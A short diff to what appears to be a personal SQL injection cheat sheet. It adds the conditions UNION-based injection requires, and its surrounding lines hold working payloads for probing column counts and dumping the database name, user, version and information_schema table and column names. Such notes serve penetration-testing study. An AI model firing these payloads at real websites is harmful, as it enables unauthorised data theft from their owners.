@@ -5,6 +5,10 @@ IN-BAND
 
 UNION Based
 
+For UNION SQLi attacks to work, we first need to satisfy two conditions:
+  The injected UNION query has to include the same number of columns as the original query.
+  The data types need to be compatible between each column.
+
 ' ORDER BY 1-- //  #test number until you a message that column is unknown
 ' UNION SELECT null, null, database(), user(), @@version  -- //   #use null as payload 
 ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
